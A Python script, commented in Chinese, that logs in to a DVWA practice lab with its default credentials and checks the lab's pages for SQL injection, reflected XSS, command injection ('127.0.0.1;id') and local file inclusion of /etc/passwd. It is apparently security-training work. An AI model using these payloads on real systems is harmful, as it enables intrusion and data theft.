"""DVWA 登录 + 漏洞测试（带 CSRF token）"""
import sys
sys.stdout.reconfigure(encoding='utf-8')

import requests
import re

DVWA = "http://47.95.192.41:8081"

s = requests.Session()

# 1. 获取登录页 + CSRF token
print("[1] 获取登录页...")
r = s.get(f"{DVWA}/login.php")
token_match = re.search(r"name='user_token' value='([^']+)'", r.text)
token = token_match.group(1) if token_match else None
print(f"    Token: {token}")

# 2. 登录（带 token）
print("\n[2] 登录...")
data = {
    "username": "admin",
    "password": "password", 
    "Login": "Login",
    "user_token": token
}
r = s.post(f"{DVWA}/login.php", data=data, allow_redirects=True)
print(f"    URL: {r.url}")
print(f"    Cookie: {dict(s.cookies)}")

if "index.php" in r.url or "Vulnerability" in r.text:
    print("    [OK] 登录成功!")
else:
    print("    [FAIL] 登录失败")
    print(f"    内容: {r.text[:200]}")
    exit(1)

# 3. 测试 SQLi
print("\n[3] 测试 SQLi...")
r = s.get(f"{DVWA}/vulnerabilities/sqli/", params={"id": "1", "Submit": "Submit"})

if "First name" in r.text:
    print("    [OK] SQLi 页面可访问")
    # 提取结果
    names = re.findall(r'First name:\s*</td><td>([^<]+)', r.text)
    surnames = re.findall(r'Surname:\s*</td><td>([^<]+)', r.text)
    print(f"    正常查询: {list(zip(names, surnames))}")
    
    # 注入测试
    r2 = s.get(f"{DVWA}/vulnerabilities/sqli/", params={"id": "1'", "Submit": "Submit"})
    if "error" in r2.text.lower() or "syntax" in r2.text.lower():
        print("    [!] SQLi Error-based 检测成功")
        errors = re.findall(r'(SQL syntax[^<]*|mysql_[^<]*)', r2.text, re.I)
        print(f"    错误信息: {errors[:2]}")
    
    # UNION 注入
    r3 = s.get(f"{DVWA}/vulnerabilities/sqli/", params={"id": "1' UNION SELECT user(),database()--", "Submit": "Submit"})
    if "root" in r3.text or "@" in r3.text:
        print("    [!] SQLi UNION 注入成功")

# 4. 测试 XSS
print("\n[4] 测试 XSS...")
r = s.get(f"{DVWA}/vulnerabilities/xss_r/", params={"name": "test123"})

if "test123" in r.text:
    print("    [OK] XSS 页面可访问")
    r2 = s.get(f"{DVWA}/vulnerabilities/xss_r/", params={"name": "<script>alert(1)</script>"})
    if "<script>alert(1)</script>" in r2.text:
        print("    [!] XSS 反射成功!")
    elif "&lt;script&gt;" in r2.text:
        print("    被转义了")

# 5. 测试 CMDi
print("\n[5] 测试 CMDi...")
r = s.get(f"{DVWA}/vulnerabilities/exec/", params={"ip": "127.0.0.1"})

if "PING" in r.text.upper() or "ping" in r.text:
    print("    [OK] CMDi 页面可访问")
    # 提取正常输出
    output = re.search(r'PING[^<]*', r.text)
    if output:
        print(f"    正常输出: {output.group()[:50]}")
    
    # 注入测试
    r2 = s.get(f"{DVWA}/vulnerabilities/exec/", params={"ip": "127.0.0.1;id"})
    if "uid=" in r2.text:
        print("    [!] CMDi 注入成功!")
        uid = re.search(r'uid=\d+\([^)]+\)', r2.text)
        if uid:
            print(f"    命令输出: {uid.group()}")

# 6. 测试 LFI
print("\n[6] 测试 LFI...")
r = s.get(f"{DVWA}/vulnerabilities/fi/", params={"page": "include.php"})

if "File" in r.text or "include" in r.text:
    print("    [OK] LFI 页面可访问")
    # 尝试读取文件
    r2 = s.get(f"{DVWA}/vulnerabilities/fi/", params={"page": "/etc/passwd"})
    if "root:" in r2.text:
        print("    [!] LFI 成功!")

print("\n" + "="*60)
print("DVWA 漏洞验证完成")
print("="*60)
